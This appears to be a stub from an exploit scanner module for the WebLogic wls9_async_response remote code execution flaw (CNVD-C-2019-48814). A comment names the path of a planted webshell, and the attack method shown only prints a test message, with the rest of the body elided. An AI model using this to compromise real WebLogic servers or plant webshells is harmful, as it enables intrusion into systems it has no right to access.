#!env python
#coding=utf-8
# CNVD-C-2019-48814 Weblogic _async / wls9_async_response
# webshell：http://ip:port/bea_wls_internal/test.jsp
...
class Exploit:
    def attack(self, url):
        print('Test Vul [{}] :CNVD-C-2019-48814 Weblogic wls9_async_response RCE'.format(url))
